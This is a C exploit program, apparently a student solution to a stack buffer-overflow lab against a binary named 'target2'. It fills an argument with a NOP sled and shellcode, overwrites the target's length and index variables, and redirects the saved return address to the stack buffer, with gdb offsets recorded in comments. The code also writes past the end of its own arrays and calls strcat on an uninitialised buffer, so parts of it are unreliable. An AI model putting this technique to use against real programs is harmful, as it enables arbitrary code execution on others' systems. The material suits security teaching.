#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "target2"
//../targets/

/*
Stack level 0, frame at 0x2021ff00:
 rip = 0x400bb5 in foo (target2.c:11); saved rip = 0x400c75
 called by frame at 0x2021ff30
 source language c.
 Arglist at 0x2021fef0, args: arg=0x7fffffffe2ec "test"
 Locals at 0x2021fef0, Previous frame's sp is 0x2021ff00
 Saved registers:
  rbp at 0x2021fef0, rip at 0x2021fef8



*/
//buffer is located at 0x2021fde0
//len is stored at 0x2021fee8
//i is stored at 0x2021feec


//buf to len is 264 bytes
//buf to i is 268 bytes
//buf to foo's rip is 280 bytes 




int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char tmp[283];
	int i,j,k;
	//unsigned char NOP[] = '\x90';
	
	for (int i=0; i<128; i++){
		tmp[i]='\x90';
	}
	strcat(tmp, shellcode);
	
	
	for (int j=173; j<264; j++){
		tmp[j]= '\x90';		
	}

	tmp[252] = '\xe0';
	tmp[253] = '\xfd';
	tmp[254] = '\x21';
	tmp[255] = '\x20';

//change len=283, 283=0x011b
	tmp[264]='\x1b';
	tmp[265]='\x01';
	tmp[266]='\x90';
	tmp[267]='\x90';

//keep i the current value (=268=0x010c)
	tmp[268]='\x0c';
	tmp[269]='\x01';
	tmp[270] = '\x90';

	for (int k=271; k<283; k++){
		tmp[k]= '\x90';
	}

	tmp[283] = '\x00';
	

	


	args[0] = TARGET;
	args[1] = tmp;
	args[2] = NULL;

	env[0] = &tmp[283];
	env[1] = &tmp[244];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}

